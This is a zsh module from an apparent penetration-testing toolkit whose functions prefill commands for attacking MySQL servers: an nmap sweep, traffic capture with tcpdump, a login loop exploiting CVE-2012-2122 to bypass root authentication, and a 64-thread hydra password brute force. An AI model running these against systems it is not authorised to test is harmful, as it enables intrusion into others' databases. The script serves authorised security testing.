#!/usr/bin/env zsh

############################################################# 
# nb-enum-mysql
#############################################################
nb-enum-mysql-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-mysql
-------------
The nb-enum-mysql namespace contains commands for scanning and enumerating mysql server services and databases.

Commands
--------
nb-enum-mysql-install             installs dependencies
nb-enum-mysql-nmap-sweep          scan a network for services
nb-enum-mysql-tcpdump             capture traffic to and from a host
nb-enum-mysql-connect             connect using the mysql client
nb-enum-mysql-auth-bypass         attempt auth bypass
nb-enum-mysql-hydra               brute force passwords for a user account

DOC
}

nb-enum-mysql-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap mysql
}

nb-enum-mysql-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "sudo grc nmap -n -Pn -sS -sV -sC --script mysql-enum -p 3306 ${__NETWORK} -oA $(__netpath)/mysql-sweep"
}

nb-enum-mysql-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3306 -w $(__hostpath)/mysql.pcap"
}

nb-enum-mysql-connect(){
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    print -z "mysql -u ${__USER} -p${__PASS} -h ${__RHOST}"
}

nb-enum-mysql-auth-bypass() {
    nb-vars-set-rhost
    __info "CVE-2012-2122"
    print -z "for i in {1..1000}; do mysql -u root --password=bad -h ${__RHOST} 2>/dev/null; done"
}

nb-enum-mysql-hydra() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    local db && __prefill db DATABASE mysql
    print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/mysql-hydra-brute.txt ${__RHOST} mysql ${db} -t 64"
}
